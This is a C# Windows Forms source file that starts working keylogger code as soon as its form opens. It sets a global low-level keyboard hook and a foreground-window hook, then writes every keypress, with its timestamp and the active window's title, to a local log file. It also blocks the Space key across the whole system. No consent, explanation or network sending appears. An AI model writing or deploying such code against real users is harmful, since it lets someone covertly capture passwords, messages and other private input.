using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using static WindowsFormsApp7.Form1;
using System.Net;


namespace WindowsFormsApp7
{
    public partial class Form1 : Form
    {
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            private static WinEventDelegate winEventDelegate;

            private static IntPtr hookID = IntPtr.Zero;
            private static IntPtr hookIDCBT = IntPtr.Zero;

        private Thread s = new Thread(() => { });

        private static readonly string logFile = Path.Combine(Directory.GetCurrentDirectory(), "log.txt.txt");
            private static readonly object locker = new object();

            public Form1()
            {
                InitializeComponent(); 
                winEventDelegate = WinEventCallback;
            StartHook();
            }
             private void StartHook()
            {

                s = new Thread(() =>
                {
                    hookID = SetKeyboardHook(HookCallback);
                    hookIDCBT = SetForegroundHook(winEventDelegate);
                    try
                    {
                        Application.Run();
                    }
                    catch
                    {
                    }
                });
                s.Start();

            }

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

            private static IntPtr SetKeyboardHook(LowLevelKeyboardProc proc)
            {
                using (var curProcess = Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private const uint EVENT_SYSTEM_FOREGROUND = 0x0003;
            private const uint WINEVENT_OUTOFCONTEXT = 0;

            private static IntPtr SetForegroundHook(WinEventDelegate proc)
            {
                return SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, proc, 0, 0, WINEVENT_OUTOFCONTEXT);
            }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string windowTitle = GetActiveWindowTitle();
                string logMessage = $"{DateTime.Now} Key pressed: {(Keys)vkCode}, Active window: {windowTitle}, Thread: {Thread.CurrentThread.ManagedThreadId}";
                lock (locker)
                {
                    File.AppendAllText(logFile, logMessage + Environment.NewLine);
                }

                if (vkCode == (int)Keys.Space)
                {
                    return new IntPtr(1);
                }
            }
            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

            private void WinEventCallback(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
            {
                if (GetActiveWindowTitle()!="")
                {
                    string logMessage = $"{DateTime.Now} Active window changed: {GetActiveWindowTitle()}, Thread: {Thread.CurrentThread.ManagedThreadId}";
                    lock (locker)
                    {
                        File.AppendAllText(logFile, logMessage + Environment.NewLine);
                    }
                }
            }

            private static string GetActiveWindowTitle()
            {
                IntPtr hWnd = GetForegroundWindow();

                if (hWnd == IntPtr.Zero)
                {
                    return "";
                }

                int length = GetWindowTextLength(hWnd);
                StringBuilder sb = new StringBuilder(length + 1);
                GetWindowText(hWnd, sb, length + 1);

                return sb.ToString();
            }

            [DllImport("user32.dll", SetLastError = true)]
            private static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

            [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            private static extern int GetWindowTextLength(IntPtr hWnd);

            [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);

            [DllImport("user32.dll")]
            private static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
            private void pictureBox1_Click(object sender, EventArgs e)
            {
                MessageBox.Show($"Thread: {Thread.CurrentThread.ManagedThreadId}");
            }
    }
}
